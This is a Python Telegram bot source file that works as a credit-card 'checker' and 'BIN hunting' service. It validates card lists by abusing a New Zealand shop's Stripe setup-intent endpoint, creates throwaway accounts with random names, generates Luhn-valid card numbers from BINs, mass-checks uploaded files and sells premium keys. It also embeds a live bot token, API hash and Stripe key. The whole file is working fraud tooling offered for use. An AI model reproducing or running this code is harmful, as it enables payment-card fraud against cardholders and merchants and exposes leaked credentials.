from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import os
import random
import datetime
from keep_alive import keep_alive
keep_alive()

api_id = 12243932
api_hash = 'b460e09ca05d1a1c9822afe0ea74be2d'
bot_token = '7568205828:AAHJ79DJPBhlJBz4AXo3rkME-BpGozd7H-o'
stripe_public_key = "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm"
app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
app.set_parse_mode(enums.ParseMode.HTML)
CREDITS_MESSAGE = "\n\nMade with ❤️ by the @propagandabots for You"

is_processing = {}
is_binning_processing = {}
user_last_command_time = {}

OWNER_IDS = [6306121574, 7419595152, 1694661268, 6574060333]

def add_credits(text):
    return text + CREDITS_MESSAGE

def get_registered_users():
    if os.path.exists("registered_users.txt"):
        with open("registered_users.txt", "r") as f:
            return set(int(line.strip()) for line in f if line.strip().isdigit())
    return set()

def is_registered(user_id):
    return user_id in get_registered_users()

def require_registration(func):
    async def wrapper(client, message):
        user_id = message.from_user.id
        if not is_registered(user_id):
            await message.reply(add_credits("👋 Hello! It looks like you're new here. Please register first using /register to access the bot's features."))
            return
        await func(client, message)
    return wrapper

def get_premium_users():
    premium_users = {}
    if os.path.exists("premium_users.txt"):
        with open("premium_users.txt", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) == 2:
                    user_id, expiry_date = parts
                    premium_users[int(user_id)] = expiry_date
    return premium_users

def is_premium(user_id):
    premium_users = get_premium_users()
    if user_id in premium_users:
        expiry_str = premium_users[user_id]
        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d")
        if expiry_date >= datetime.datetime.now():
            return True
    return False

def owner_only(func):
    async def wrapper(client, message):
        user_id = message.from_user.id
        if user_id not in OWNER_IDS:
            await message.reply("You are not authorized to use this command.")
            return
        await func(client, message)
    return wrapper

def is_rate_limited(user_id, rate_limit_seconds=2):
    current_time = time.time()
    if user_id in user_last_command_time:
        last_time = user_last_command_time[user_id]
        if current_time - last_time < rate_limit_seconds:
            remaining_time = rate_limit_seconds - (current_time - last_time)
            return True, f"⏳ Whoa! Please wait for {remaining_time:.2f} more seconds before using that command again."
    user_last_command_time[user_id] = current_time
    return False, None

async def get_bin_details(bin):
    api = f"https://bins.antipublic.cc/bins/{bin}"
    response = requests.get(api)
    data = response.json()
    brand = data.get('brand', '------')
    bin_type = data.get('type', '------')
    type_value = data.get('level', '------')
    issuer = data.get('bank', '------')
    country_name = data.get('country_name', '------')
    emoji = data.get('country_flag', '------')
    return brand, bin_type, type_value, issuer, country_name, emoji

async def check_card(cc, mm, yy, cvc):
    start_time = time.time()
    stripe_url = "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
    stripe_response = requests.post(stripe_url, data={"payment_method": "stripe_cc"})
    stripe_response_json = stripe_response.json()
    if "intent" in stripe_response_json and "client_secret" in stripe_response_json["intent"]:
        seti = stripe_response_json["intent"]["client_secret"]
    else:
        return "Error: 'client_secret' not found."
    confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti.split('_secret_')[0]}/confirm"
    confirm_data = {
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[billing_details][address][postal_code]": "10080",
        "key": stripe_public_key,
        "client_secret": seti
    }
    confirm_response = requests.post(confirm_url, data=confirm_data)
    confirm_response_json = confirm_response.json()
    end_time = time.time()
    time_taken = end_time - start_time
    bin_code = cc[:6]
    brand, bin_type, type_value, issuer, country_name, emoji = await get_bin_details(bin_code)
    if confirm_response.status_code == 200 and confirm_response_json.get("status") == "succeeded":
        return f"""<b>Approved ✅</b>

<b>Card:</b> <code>{cc}|{mm}|{yy}|{cvc}</code>
<b>Gateway:</b> Stripe Auth
<b>Response:</b> Approved

<b>Info:</b> {brand} - {bin_type} - {type_value}
<b>Issuer:</b> {issuer}
<b>Country:</b> {country_name} {emoji}

<b>Time:</b> {time_taken:.2f} seconds
"""
    elif 'error' in confirm_response_json:
        decline_code = confirm_response_json['error'].get('decline_code', 'Unknown')
        decline_message = confirm_response_json['error'].get('message', 'Unknown error')
        return f"""<b>Declined ❌</b>

<b>Card:</b> <code>{cc}|{mm}|{yy}|{cvc}</code>
<b>Gateway:</b> Stripe Auth
<b>Response:</b> {decline_code}: {decline_message}

<b>Info:</b> {brand} - {bin_type} - {type_value}
<b>Issuer:</b> {issuer}
<b>Country:</b> {country_name} {emoji}

<b>Time:</b> {time_taken:.2f} seconds
"""
    else:
        return "<b>Unknown Error</b>\nNo valid response was received from the payment gateway."

@app.on_message(filters.command("register"))
async def register(client, message):
    user_id = message.from_user.id
    if is_registered(user_id):
        await message.reply("🙌 You're already registered and ready to go! Use /cmds to see what you can do.")
        return
    with open("registered_users.txt", "a") as f:
        f.write(f"{user_id}\n")
    await message.reply("✅ You have been successfully registered! Welcome aboard! 🎉 Feel free to explore the bot's features using /cmds.")

@app.on_message(filters.command("announce"))
@owner_only
async def announce(client, message):
    if len(message.command) < 2:
        await message.reply("Please provide a message to announce.")
        return
    announcement_text = message.text.split(None, 1)[1]
    announcement = f"📢 <b>Announcement</b>\n\n{announcement_text}"
    registered_users = get_registered_users()
    for user_id in registered_users:
        try:
            await client.send_message(chat_id=user_id, text=announcement)
        except Exception:
            continue
    await message.reply("📢 Your announcement has been sent to all registered users!")

@app.on_message(filters.command("genkey"))
@owner_only
async def genkey(client, message):
    args = message.command
    amount_of_keys = 1
    days = 30
    if len(args) == 1:
        pass
    elif len(args) == 2:
        try:
            amount_of_keys = int(args[1])
        except ValueError:
            await message.reply("Please provide a valid number for amount of keys.")
            return
    elif len(args) == 3:
        try:
            amount_of_keys = int(args[1])
            days = int(args[2])
        except ValueError:
            await message.reply("Please provide valid numbers for amount of keys and days.")
            return
    else:
        await message.reply("Usage: /genkey (amount of keys) (days)")
        return
    keys = []
    for _ in range(amount_of_keys):
        key = generate_key()
        keys.append(key)
        with open("keys.txt", "a") as f:
            f.write(f"{key} {days}\n")
    keys_str = "\n".join(keys)
    await message.reply(f"🔑 Generated {amount_of_keys} key(s) for {days} days:\n{keys_str}")

def generate_key():
    import random
    part1 = ''.join(random.choices('0123456789', k=4))
    part2 = ''.join(random.choices('0123456789', k=4))
    key = f"PPG-{part1}-{part2}"
    return key

@app.on_message(filters.command("redeem"))
@require_registration
async def redeem_key(client, message):
    user_id = message.from_user.id
    if len(message.command) != 2:
        await message.reply("Usage: /redeem [key]")
        return
    key_to_redeem = message.command[1]
    if not os.path.exists("keys.txt"):
        await message.reply("Invalid or expired key.")
        return
    key_found = False
    keys = []
    with open("keys.txt", "r") as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) != 2:
                continue
            key, days = parts
            if key == key_to_redeem:
                key_found = True
                days = int(days)
            else:
                keys.append(f"{key} {days}")
    if key_found:
        with open("keys.txt", "w") as f:
            for key_line in keys:
                f.write(f"{key_line}\n")
        expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
        expiry_str = expiry_date.strftime("%Y-%m-%d")
        premium_users = get_premium_users()
        premium_users[user_id] = expiry_str
        with open("premium_users.txt", "w") as f:
            for uid, exp in premium_users.items():
                f.write(f"{uid} {exp}\n")
        await message.reply(add_credits(f"🎉 Congratulations! You have been granted premium access until {expiry_str}. Enjoy the premium features!"))
    else:
        await message.reply("Invalid or expired key.")

@app.on_message(filters.command("start"))
@require_registration
async def start(client, message):
    user_id = message.from_user.id
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(limit_message)
        return
    await message.reply(add_credits("👋 Hello! Welcome to our bot! We're glad to have you here. Use /cmds to see what I can do for you! 😊 "))

@app.on_message(filters.command("cmds"))
@require_registration
async def cmds(client, message):
    user_id = message.from_user.id
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(add_credits(limit_message))
        return
    available_cmds = """
📜 <b>Available Commands:

/start - Start the bot and get a welcome message.
/register - Register yourself to use the bot.
/cmds - Display this list of commands.
/binning - Upload BINs to generate and check cards (bin hunting).
/chk - Check a single card in the format cc|mm|yy|cvc.
/mchk - Check multiple cards in the format cc|mm|yy|cvc.
/bin - Look up information about a BIN.
/gen - Generate cards from a BIN (generates 10 cards).
/mass - Upload a .txt file to mass check cards.
/stop - Stop any ongoing mass check or binning process.
/redeem - Redeem a key for premium access. </b>
"""
    await message.reply(add_credits(available_cmds))

@app.on_message(filters.command("chk"))
@require_registration
async def single_check(client, message):
    user_id = message.from_user.id
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(limit_message)
        return
    if len(message.command) < 2:
        await message.reply("❗️ Oops! Please make sure to provide the card details in the correct format: <code>cc|mm|yy|cvc</code>")
        return
    cc_info = message.text.split(None, 1)[1].strip()
    try:
        cc, mm, yy, cvc = cc_info.split("|")
    except ValueError:
        await message.reply("❗️ Oops! Please make sure to provide the card details in the correct format: <code>cc|mm|yy|cvc</code>")
        return
    processing_msg = await message.reply("⏳ Processing your card, please wait a moment...")
    response = await check_card(cc, mm, yy, cvc)
    await processing_msg.edit_text(response)

@app.on_message(filters.command("bin"))
@require_registration
async def bin_check(client, message):
    user_id = message.from_user.id
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(limit_message)
        return
    if len(message.command) < 2:
        await message.reply("Please provide a BIN to check.")
        return
    bin_input = message.text.split(None, 1)[1].strip()
    if len(bin_input) < 6:
        await message.reply("Please provide a valid 6-digit BIN.")
        return
    bin_code = bin_input[:6]
    processing_msg = await message.reply("Please wait, processing...")
    brand, bin_type, type_value, issuer, country_name, emoji = await get_bin_details(bin_code)
    response = f"""<b>BIN Lookup Result 🔍</b>

<b>BIN ⇾</b> <code>{bin_code}</code>

<b>Info ⇾</b> {brand} - {bin_type} - {type_value}
<b>Issuer ⇾</b> {issuer}
<b>Country ⇾</b> {country_name} {emoji}
"""
    await processing_msg.edit_text(response)

@app.on_message(filters.command("mchk"))
@require_registration
async def multi_check(client, message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        await message.reply("✨ This feature is available for premium users. Upgrade to premium to access this command!")
        return
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(limit_message)
        return
    cc_info_list = message.text.split("\n")[1:]
    if len(cc_info_list) == 0:
        await message.reply("Please provide credit cards in the format: cc|mm|yy|cvc")
        return
    for cc_info in cc_info_list:
        cc_info = cc_info.strip().split('|')
        if len(cc_info) == 4:
            cc, mm, yy, cvc = cc_info
            response = await check_card(cc, mm, yy, cvc)
            await message.reply(response)

@app.on_message(filters.command("mass"))
@require_registration
async def mass_check(client, message):
    user_id = message.from_user.id
    if is_processing.get(user_id):
        await message.reply("You already have an active mass check process.")
        return
    is_processing[user_id] = True
    await message.reply("📂 Ready to start mass checking? Please upload a <b>.txt file</b> with one card per line in the format <code>cc|mm|yy|cvc</code>. Let's get checking! 🚀")

@app.on_message(filters.command("gen"))
@require_registration
async def generate_cards(client, message):
    user_id = message.from_user.id
    limited, limit_message = is_rate_limited(user_id)
    if limited:
        await message.reply(limit_message)
        return
    if len(message.command) < 2:
        await message.reply("Please provide a BIN in the format: /gen [BIN] or /gen [BIN]|[MM]|[YY]|[CVV].")
        return
    input_data = message.command[1].strip()
    exp_month, exp_year, cvv = None, None, None
    if '|' in input_data:
        parts = input_data.split('|')
        bin_input = parts[0]
        if len(parts) > 1:
            exp_month = parts[1] if len(parts[1]) == 2 else None
        if len(parts) > 2:
            exp_year = parts[2] if len(parts[2]) == 2 else None
        if len(parts) > 3:
            cvv = parts[3] if len(parts[3]) >= 3 else None
    else:
        bin_input = input_data
    if len(bin_input) < 6:
        await message.reply("The BIN should be at least 6 digits.")
        return
    await message.reply("🔄 Generating cards for your BIN, please wait a moment...")
    bin_info = await get_bin_details(bin_input[:6])
    generated_cards = []
    for _ in range(10):
        if exp_month and exp_year and cvv:
            card, _, _, _ = gencc(bin_input)
            generated_cards.append(f"<code>{card}|{exp_month}|{exp_year}|{cvv}</code>")
        else:
            card, exp_month_gen, exp_year_gen, cvv_gen = gencc(bin_input)
            generated_cards.append(f"<code>{card}|{exp_month or exp_month_gen}|{exp_year or exp_year_gen}|{cvv or cvv_gen}</code>")
    cards_formatted = "\n".join(generated_cards)
    bin_details_formatted = f"""
<b>BIN:</b> {bin_input}
<b>Info:</b> {bin_info[0]} - {bin_info[1]} - {bin_info[2]}
<b>Issuer:</b> {bin_info[3]}
<b>Country:</b> {bin_info[4]} {bin_info[5]}

<b>Generated Cards:</b>
{cards_formatted}
"""
    await message.reply(bin_details_formatted)

@app.on_message(filters.command("stop"))
@require_registration
async def stop_process(client, message):
    user_id = message.from_user.id
    if is_processing.get(user_id, False):
        is_processing[user_id] = False
        await message.reply(add_credits("❌ <b>Mass checking process has been stopped.</b>"))
    elif is_binning_processing.get(user_id, False):
        is_binning_processing[user_id] = False
        await message.reply(add_credits("❌ <b>Bin hunting process has been stopped.</b>"))
    else:
        await message.reply(add_credits("🤔 There's no active process to stop at the moment. If you need assistance, feel free to start a new one!"))

@app.on_message(filters.document & filters.create(lambda _, __, message: is_processing.get(message.from_user.id, False)))
@require_registration
async def handle_mass_file(client, message):
    user_id = message.from_user.id
    if not is_processing.get(user_id):
        await message.reply("No active mass checking process. Use /mass to start.")
        return
    if message.document and message.document.file_name.endswith('.txt'):
        document = await client.download_media(message.document)
        with open(document, 'r') as file:
            lines = file.readlines()
        total_cards = len(lines)
        if is_premium(user_id):
            max_cards = 100
        else:
            max_cards = 35
        if total_cards > max_cards:
            await message.reply(f"You can check up to {max_cards} cards.")
            is_processing[user_id] = False
            os.remove(document)
            return
        inline_buttons = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(f"Total Cards: {total_cards}", callback_data="total")],
                [InlineKeyboardButton("✅ Approved: 0", callback_data="approved")],
                [InlineKeyboardButton("❌ Declined: 0", callback_data="declined")],
                [InlineKeyboardButton("⚠️ Error: 0", callback_data="error")]
            ]
        )
        processing_message = await message.reply("Processing cards... Please wait!", reply_markup=inline_buttons)
        approved_count = 0
        declined_count = 0
        error_count = 0
        last_cc = None
        last_response = None
        for line in lines:
            if not is_processing.get(user_id):
                await processing_message.edit_text("Mass checking process stopped.")
                break
            cc_info = line.strip().split('|')
            if len(cc_info) != 4:
                continue
            cc, mm, yy, cvc = cc_info
            last_cc = f"{cc}|{mm}|{yy}|{cvc}"
            response = await check_card(cc, mm, yy, cvc)
            if "Approved" in response:
                approved_count += 1
                last_response = "✅ Approved"
                await message.reply(response)
            elif "Declined" in response:
                declined_count += 1
                last_response = "❌ Declined"
            elif "Error" in response:
                error_count += 1
                last_response = "⚠️ Error"
            inline_buttons = InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton(f"Total Cards: {total_cards}", callback_data="total")],
                    [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="approved")],
                    [InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="declined")],
                    [InlineKeyboardButton(f"⚠️ Error: {error_count}", callback_data="error")]
                ]
            )
            text_to_edit = f"🔄 <b>Last CC:</b> <code>{last_cc}</code>\n<b>Response:</b> {last_response}\n\n"
            text_to_edit += "⏳ Checking cards... Please wait!"
            await processing_message.edit_text(text_to_edit, reply_markup=inline_buttons)
        if is_processing.get(user_id):
            await processing_message.edit_text(
        f"✅ <b>All done!</b>\n"
        f"🔢 <b>Last CC Checked:</b> <code>{last_cc}</code>\n"
        f"📋 <b>Last Response:</b> {last_response}\n\n"
        f"🎉 <b>Summary:</b>\n"
        f"✅ Approved: {approved_count}\n"
        f"❌ Declined: {declined_count}\n"
        f"⚠️ Error: {error_count}"
    )
            is_processing[user_id] = False
        os.remove(document)
    else:
        await message.reply("Please upload a valid .txt file.")

def gencc(U):
    while True:
        if len(U) < 16:
            U = U + 'x'
        else:
            break
    def C(L):
        def B(n): return [int(A) for A in str(n)]
        C = B(L)
        D = C[-1::-2]
        E = C[-2::-2]
        A = 0
        A += sum(D)
        for F in E:
            A += sum(B(F * 2))
        return A % 10
    def D(x, t):
        def G(aS, n):
            aS = str(aS)
            if n >= 1:
                A = aS[-n:]
            else:
                A = ''
            return A
        def C(aS, n, n2=None):
            A = n2
            aS = str(aS)
            if A is None or A == '':
                A = len(aS)
            n, A = int(n), int(A)
            if n < 0:
                n += 1
            B = aS[n-1:n-1+A]
            return B
        def B(x, t=1):
            x = str(x)
            if t > 0:
                while len(x) > t:
                    A = sum([int(x[A]) for A in range(len(x))])
                    x = str(A)
            else:
                for B in range(abs(t)):
                    A = sum([int(x[A]) for A in range(len(x))])
                    x = str(A)
            return int(x)
        D = False
        E = ''
        A = 1
        for H in range(1, len(x)):
            I = int(C(x, H, 1)) * int(C('21', A, 1))
            E += str(B(I))
            A += 1
            if A > len('21'):
                A = 1
        F = B(E, -1)
        if (10 * B(F, -1) - F) % 10 == int(G(x, 1)):
            D = True
        return D
    while True:
        A = ''
        for B in U:
            if len(A) < 16 and 'x' == B.lower():
                A += str(random.randint(0, 9))
            else:
                A += str(B)
        if C(A) == 0 and D(A, random.randint(0, 9)):
            return A, str(random.choice(list(range(1, 13)))).zfill(2), str(random.choice(list(range(datetime.date.today().year+1, datetime.date.today().year+8))))[-2:], str(random.randrange(1000)).zfill(3)

@app.on_message(filters.command("binning"))
@require_registration
async def binning(client, message):
    user_id = message.from_user.id
    is_binning_processing[user_id] = True
    await message.reply_text(add_credits(
        "🎯 <b>Welcome to Bin Hunting!</b> 🎯\n\n"
        "Please send me your BINs to start hunting. You can either:\n"
        "📄 Send a <b>.txt file</b> with one BIN per line, or\n"
        "💬 Send a message with BINs separated by new lines.\n\n"
        "📌 <i>Example BINs:</i>\n"
        "<code>434769123456</code>\n"
        "<code>440393987654</code>\n"
        "<code>411111111111</code>\n\n"
        "⚠️ <i>Note: Each BIN should be between 6 and 16 digits.</i>\n\n"
        "When you're ready, send me the BINs, and I'll start the hunt! 🏹"
    ))

@app.on_message(filters.text & filters.create(lambda _, __, message: is_binning_processing.get(message.from_user.id, False)))
@require_registration
async def handle_binning_text(client, message):
    user_id = message.from_user.id
    if not is_binning_processing.get(user_id, False):
        return
    bin_list = message.text.strip().splitlines()
    if is_premium(user_id):
        max_bins = 30
    else:
        max_bins = 5
    if len(bin_list) > max_bins:
        await message.reply(f"You can provide up to {max_bins} BINs.")
        is_binning_processing[user_id] = False
        return
    valid_bins = [bin.strip() for bin in bin_list if bin.strip().isdigit() and 6 <= len(bin.strip()) <= 16]
    if not valid_bins:
        await message.reply_text("❗️ Uh-oh! It seems like some BINs are invalid.\n\nPlease ensure each BIN is numeric and contains between 6 and 16 digits. Let's try again! 😊")

        return
    await message.reply_text("📄 <b>BINs received!</b>\n\n🔍 <i>Starting the BIN hunt now...</i> 🏹")
    await process_bins(valid_bins, message)


@app.on_message(filters.document & filters.create(lambda _, __, message: is_binning_processing.get(message.from_user.id, False)))
@require_registration
async def handle_binning_file(client, message):
    user_id = message.from_user.id
    if not is_binning_processing.get(user_id, False):
        await message.reply("⚠️ No active binning process. Start with /binning.")
        return
    if message.document and message.document.file_name.endswith('.txt'):
        file_path = await client.download_media(message.document)
        with open(file_path, 'r') as file:
            bins = file.readlines()
        if is_premium(user_id):
            max_bins = 30
        else:
            max_bins = 5
        if len(bins) > max_bins:
            await message.reply(f"You can provide up to {max_bins} BINs.")
            is_binning_processing[user_id] = False
            os.remove(file_path)
            return
        valid_bins = [bin.strip() for bin in bins if bin.strip().isdigit() and 6 <= len(bin.strip()) <= 16]
        if not valid_bins:
            await message.reply_text("❗️ Uh-oh! It seems like some BINs are invalid.\n\nPlease ensure each BIN is numeric and contains between 6 and 16 digits. Let's try again! 😊")
            return
        await message.reply_text("📂 <b>BIN file received!</b>\n\n🛠️ <i>Now, let’s get to work!</i> 💼")
        await process_bins(valid_bins, message)
    else:
        await message.reply("Please upload a valid .txt file.")

async def check_bin_card(cc, mm, yy, cvc):
    start_time = time.time()

    stripe_public_key = "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm"

    user_url = "https://random-data-api.com/api/v2/users?size=1&is_xml=true"
    user_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    user_response = requests.get(user_url, headers=user_headers)
    user_data = user_response.json()
    first_name = user_data['first_name']
    last_name = user_data['last_name']
    email = f"{first_name}{last_name}@gmail.com"

    add_payment_method_url = "https://shopzone.nz/my-account/add-payment-method/"
    payment_method_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    payment_method_response = requests.get(add_payment_method_url, headers=payment_method_headers)
    payment_method_content = payment_method_response.text
    regnon_start = payment_method_content.find('id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="') + len('id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="')
    regnon_end = payment_method_content.find('"', regnon_start)
    regnon = payment_method_content[regnon_start:regnon_end]

    register_url = "https://shopzone.nz/my-account/add-payment-method/"
    register_data = {
        "email": email,
        "woocommerce-register-nonce": regnon,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "register": "Register"
    }

    register_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    requests.post(register_url, data=register_data, headers=register_headers)

    stripe_url = "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
    stripe_data = {"payment_method": "stripe_cc"}
    stripe_response = requests.post(stripe_url, data=stripe_data, headers=register_headers)

    stripe_response_json = stripe_response.json()

    if "intent" in stripe_response_json and "client_secret" in stripe_response_json["intent"]:
        seti = stripe_response_json["intent"]["client_secret"]
        secret = seti.split("_secret_")[0]
    else:
        return "Error: 'client_secret' not found."

    stripe_metadata_url = "https://m.stripe.com/6"
    stripe_metadata_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    stripe_metadata_response = requests.post(stripe_metadata_url, headers=stripe_metadata_headers)
    stripe_metadata_json = stripe_metadata_response.json()
    guid = stripe_metadata_json["guid"]
    muid = stripe_metadata_json["muid"]
    sid = stripe_metadata_json["sid"]

    postal_code = "10080"

    confirm_url = f"https://api.stripe.com/v1/setup_intents/{secret}/confirm"
    confirm_data = {
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[billing_details][address][postal_code]": postal_code,
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": stripe_public_key,
        "client_secret": seti
    }

    confirm_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    confirm_response = requests.post(confirm_url, data=confirm_data, headers=confirm_headers)
    confirm_response_json = confirm_response.json()

    end_time = time.time()
    time_taken = end_time - start_time

    bin_code = cc[:6]
    brand, bin_type, type_value, issuer, country_name, emoji = await get_bin_details(bin_code)

    if confirm_response.status_code == 200 and confirm_response_json.get("status") == "succeeded":
        return f"""✅ Approved | Card: {cc}|{mm}|{yy}|{cvc} | Issuer: {issuer} | Country: {country_name} {emoji} | Time: {time_taken:.2f} sec"""
    elif 'error' in confirm_response_json:
        decline_message = confirm_response_json['error'].get('message', 'Unknown error')
        return f"""❌ Declined | Card: {cc}|{mm}|{yy}|{cvc} | {decline_message} | Issuer: {issuer} | Country: {country_name} {emoji} | Time: {time_taken:.2f} sec"""
    else:
        return "Unknown Error: No valid response from payment gateway."

async def process_bins(valid_bins, message):
    user_id = message.from_user.id
    approved_bins_more_than_3 = set()
    approved_bins_less_than_3 = set()
    all_declined_bins = set()
    bin_approved_count = {}

    if is_premium(user_id):
        timeout = 15
    else:
        timeout = 60

    for bin_code in valid_bins:
        if not is_binning_processing.get(user_id, False):
            await message.reply_text(f"❌ Bin hunting process has been stopped.")
            break

        bin_prefix = bin_code[:6]
        bin_approved_count[bin_prefix] = 0
        await message.reply_text(f"🔍 Hunting BIN: {bin_prefix} 🔥")

        for _ in range(4):
            if not is_binning_processing.get(user_id, False):
                await message.reply_text(f"❌ Bin hunting process has been stopped.")
                return

            cc_number, exp_month, exp_year, cvv = gencc(bin_code)
            result = await check_bin_card(cc_number, exp_month, exp_year, cvv)

            if not is_binning_processing.get(user_id, False):
                await message.reply_text(f"❌ Bin hunting process has been stopped.")
                return

            if "Approved" in result:
                bin_approved_count[bin_prefix] += 1
                await message.reply_text(result)
                if bin_approved_count[bin_prefix] == 1:
                    for _ in range(2):
                        if not is_binning_processing.get(user_id, False):
                            await message.reply_text(f"❌ Bin hunting process has been stopped.")
                            return
                        cc_number, exp_month, exp_year, cvv = gencc(bin_code)
                        result = await check_bin_card(cc_number, exp_month, exp_year, cvv)
                        if "Approved" in result:
                            bin_approved_count[bin_prefix] += 1
                        await message.reply_text(result)
                    break  
            else:
                await message.reply_text(result)

        if not is_binning_processing.get(user_id, False):
            await message.reply_text(f"❌ Bin hunting process has been stopped.")
            break

        if bin_approved_count[bin_prefix] >= 3:
            approved_bins_more_than_3.add(bin_prefix)
        elif 1 <= bin_approved_count[bin_prefix] < 3:
            approved_bins_less_than_3.add(bin_prefix)
        elif bin_approved_count[bin_prefix] == 0:
            all_declined_bins.add(bin_prefix)

    approved_bins_more_3_summary = (
        f"✅ <b>3+ Approved CC Bins ({len(approved_bins_more_than_3)}):</b>\n" + "\n".join(approved_bins_more_than_3)
        if approved_bins_more_than_3 else "⚠️ <b>No bins with 3+ approvals.</b>"
    )

    approved_bins_less_3_summary = (
        f"✅ <b>< 3 Approved CC Bins ({len(approved_bins_less_than_3)}):</b>\n" + "\n".join(approved_bins_less_than_3)
        if approved_bins_less_than_3 else "⚠️ <b>No bins with less than 3 approvals.</b>"
    )

    declined_bins_summary = (
        f"❌ <b>All CC Declined Bins ({len(all_declined_bins)}):</b>\n" + "\n".join(all_declined_bins)
        if all_declined_bins else "✅ <b>No bins with all declined cards.</b>"
    )

    await message.reply_text(f"{approved_bins_more_3_summary}\n\n{approved_bins_less_3_summary}\n\n{declined_bins_summary}")
    is_binning_processing[user_id] = False

app.run()
